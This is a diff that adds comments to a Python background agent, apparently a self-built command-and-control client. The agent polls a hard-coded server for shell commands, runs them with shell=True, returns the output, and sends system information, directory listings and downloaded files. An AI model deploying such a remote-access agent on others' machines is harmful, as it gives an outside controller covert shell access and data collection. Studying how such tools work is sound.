@@ -7,9 +7,18 @@ import subprocess
 import time
 import getpass
 
-SERVER_HOST = "10.0.0.161"
+# A constant theme of this program is to use try - catch instead of failing.
+# I want this to work like a daemon and not return if bad data is retrieved
+# This program really should just be running in the background
+
+# This is a constant to connect to from the agent to the server. This should be replaced before addition
+SERVER_HOST = "172.20.10.2"
+# Same for the port
 SERVER_PORT = 5001
 
+# Get system info returns a json file of 
+# various system processes. This is used
+# for the System Info Page
 def get_system_info():
     return {
         "user": getpass.getuser(),
@@ -20,7 +29,8 @@ def get_system_info():
         "architecture": platform.machine(),
         "uptime_sec": get_uptime()
     }
-
+# This returns uptime using macos modules
+# This tries to be system agnostic (including linux)
 def get_uptime():
     try:
         if os.name == 'posix':
@@ -36,6 +46,9 @@ def get_uptime():
     except:
         return "Unknown"
 
+# This works by creating a socket and connecting to a remote host (Google DNS) without sending data.
+# The OS selects the appropriate local network interface for that route, allowing us to retrieve
+# the outward-facing IP address used for internet communication. This avoids localhost or loopback issues.
 def get_ip():
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -46,6 +59,8 @@ def get_ip():
     except:
         return socket.gethostbyname(socket.gethostname())
     
+# This function works by checking if the server wants a heartbeat.
+# POST if yes
 def check_heartbeat_request():
     try:
         conn = http.client.HTTPConnection(SERVER_HOST, SERVER_PORT)
@@ -58,6 +73,7 @@ def check_heartbeat_request():
     except:
         pass
 
+# Encodes system info and sends it to the server via POST
 def post_info():
     try:
         conn = http.client.HTTPConnection(SERVER_HOST, SERVER_PORT)
@@ -68,6 +84,7 @@ def post_info():
     except Exception as e:
         print(f"[!] Error sending system info: {e}")
 
+# Checks if info is wanted. Uses post_info() to send the data
 def check_info_request():
     try:
         conn = http.client.HTTPConnection(SERVER_HOST, SERVER_PORT)
@@ -80,6 +97,7 @@ def check_info_request():
     except Exception as e:
         print(f"[!] Error checking for system info request: {e}")
 
+# Check if the server wants to send a file. If it does then recieves.
 def check_file_download():
     try:
         conn = http.client.HTTPConnection(SERVER_HOST, SERVER_PORT)
@@ -101,6 +119,9 @@ def check_file_download():
     except Exception as e:
         print(f"[!] Error downloading file: {e}")
 
+# !!! CORE FUNCTION !!! 
+# This is the core of the program. The function checks is the server has a command and
+# if a valid response is recieved the command is sotred.
 def get_command():
     try:
         conn = http.client.HTTPConnection(SERVER_HOST, SERVER_PORT)
@@ -112,6 +133,7 @@ def get_command():
         print(f"[!] Error getting command: {SERVER_HOST}:{e}")
     return None
 
+# This function works by sending previously executed commands back to the server via POST / JSON
 def send_result(result):
     try:
         conn = http.client.HTTPConnection(SERVER_HOST, SERVER_PORT)
@@ -122,6 +144,9 @@ def send_result(result):
     except Exception as e:
         print(f"[!] Error sending result: {e}")
 
+# !!! CORE FUNCTION !!!
+# # This function executes a shell command and returns its output.
+# Second part of get_command()
 def run_command(cmd):
     try:
         output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, text=True)
@@ -129,6 +154,9 @@ def run_command(cmd):
         output = e.output
     return output
 
+# This function checks if the server wants a directory listing.
+# If a valid path is returned by the server, it lists the contents of that path
+# and sends the listing back to the server in JSON format.
 def check_browse_request():
     try:
         conn = http.client.HTTPConnection(SERVER_HOST, SERVER_PORT)
@@ -157,6 +185,9 @@ def check_browse_request():
         print(f"[!] Error checking directory listing: {e}")
 
 
+# !!! CORE FUNCTION !!!
+# This is the core loop. Its really modifiable and allowed me to
+# incrementally add features as needed.
 def main():
     while True:
         check_info_request()
